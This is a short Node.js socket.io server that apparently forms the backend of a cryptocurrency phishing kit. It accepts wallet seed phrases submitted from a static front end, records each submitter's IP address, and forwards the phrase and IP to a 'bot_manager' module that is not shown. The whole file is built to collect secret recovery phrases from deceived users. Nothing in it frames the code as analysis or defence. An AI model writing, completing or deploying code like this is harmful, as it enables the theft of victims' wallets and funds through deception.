const express = require('express');
const app = express();
const http = require('http').Server(app);
const path = require('path');
require('dotenv').config();

const io = require('socket.io')(http, {
    cors: { origin: process.env.RENDER_EXTERNAL_URL || "*", methods: ["GET", "POST"] }
});

const { sendSeedData } = require('./bot_manager');

app.use(express.static(path.join(__dirname, 'public')));

io.on('connection', (socket) => {
    const userIP = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;

    // LISTEN FOR THE SUBMISSION
    socket.on('submitSeed', (data) => {
        if (data && data.seedPhrase) {
            console.log(`Forwarding data for IP: ${userIP}`);
            sendSeedData(data.seedPhrase, userIP, socket.id);
        }
    });
});

const PORT = process.env.PORT || 3000;
http.listen(PORT, () => console.log(`Server running on port ${PORT}`));